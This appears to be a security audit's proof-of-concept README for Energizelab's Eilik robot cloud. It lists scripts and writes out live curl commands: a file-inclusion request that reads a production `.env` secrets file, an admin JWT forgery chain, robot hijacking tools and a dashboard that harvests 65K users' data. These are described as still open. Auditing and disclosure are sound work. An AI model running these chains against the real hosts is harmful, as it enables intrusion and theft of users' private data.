# PoCs: Eilik / Energizelab

All PoCs are **non-destructive**: read-only checks, markers on fictional SNs/emails, no uploads, no writes to third-party data. They reproduce the chains documented in `../findings/`.

## Prerequisites

```bash
pip3 install requests pyjwt cryptography
cp ../.env.example .env      # then fill in EILIK_JWT (see below)
```

Infra passwords (MySQL/Redis/SSH, EK-25/26/27) are redacted from the repo.
Set `EILIK_MYSQL_PWD`, `EILIK_REDIS_PWD`, `EILIK_SSH_PWD` in `.env` to let
`retest.py` verify rotation; without them those three checks report `N-R`.

**Getting a user JWT**: any email address + OTP
(renew with `POST /api/auth/refreshToken {"token": "<refresh>"}`: the JWT
expires after 2 hours):

```bash
curl -X POST http://auth.energizelab.com.cn:9080/api/auth/requestCode \
     -H 'Content-Type: application/json' -d '{"email":"you@example.com"}'
# code arrives by email (6 digits)
curl -X POST http://auth.energizelab.com.cn:9080/api/auth/loginByCode \
     -H 'Content-Type: application/json' -d '{"email":"you@example.com","code":"XXXXXX"}'
```

## Scripts

| Script | Findings | Chain demonstrated |
|---|---|---|
| `poc_01_unauth.sh` | [EK-02](../findings/01-cloud-api.md#EK-02) / [EK-06](../findings/01-cloud-api.md#EK-06) / [EK-12](../findings/01-cloud-api.md#EK-12) / [EK-21](../findings/01-cloud-api.md#EK-21) / [EK-24](../findings/01-cloud-api.md#EK-24) | The zero-credential surface: PII, Swagger, RBAC, 14B-token stats, LLM inference, device JWT for a fictional SN |
| `poc_02_takeover.py` | [EK-08](../findings/01-cloud-api.md#EK-08)→09→10 | LFI → `.env` vault → super-admin JWT forgery → id=1 profile served |
| `poc_03_sign_forge.py` | [EK-06](../findings/01-cloud-api.md#EK-06) / [EK-07](../findings/01-cloud-api.md#EK-07) | Zero-auth device JWT + forged RSA-OAEP sign (the `time+number` arithmetic check) |
| `poc_04_supply_chain.py` | [EK-22](../findings/01-cloud-api.md#EK-22) | Pre-signed PUTs issued for production firmware (stops short of uploading) |
| `retest.py` | all | **Full harness** (49 checks): regenerates `RETEST.md` |

```bash
./poc_01_unauth.sh
python3 poc_02_takeover.py --jwt "$(grep EILIK_JWT .env | cut -d= -f2-)"
# poc_03: first save the LFI-read .env:
curl -s -H "Authorization: Bearer $JWT" \
  "http://45.32.81.33:9090/api/lang-test-log/download-audio?url=/usr/src/app/.env.domestic" \
  > .env.domestic.lfi
python3 poc_03_sign_forge.py --env-file .env.domestic.lfi
python3 poc_04_supply_chain.py --jwt "$JWT"
```

## `retest.py`: full retest harness

```bash
python3 retest.py --env ../eilik-poc/.env --out .        # everything
python3 retest.py --skip-infra                            # without MySQL/Redis/SSH
```

Statuses: `OPEN` (still exploitable) · `PARTIAL` (hardened) · `FIXED`.
Last run: **2026-09-01** → **48 OPEN, 1 PARTIAL** (49 checks: device/static
findings are revalidated via `../artifacts/`, see `RETEST.md`).

## `hijack/`: robot takeover (EK-15/36)

PoCs replayed on the auditor's own robot on 2026-09-01:
`setup_rogue_ap.sh` (re-provisioning to an attacker AP), `fake_ai_server.py`
(spoofed AI server), `history_poison*.py` (session poisoning).

## `dashboard/`: mass-exfiltration proof

Flask + PostgreSQL app that syncs (via the unscoped APIs, [EK-13](../findings/01-cloud-api.md#EK-13)) and serves
the demonstration dashboard: 65K users with psychological profiles, 8.3M
conversations with IPs, robots, geolocation.

```bash
cd dashboard && docker compose up -d
open http://localhost:8080
```

The `test_*.sh` scripts in the dashboard individually test: PII enumeration,
unauthenticated AI inference, the admin backend, and voice cloning.
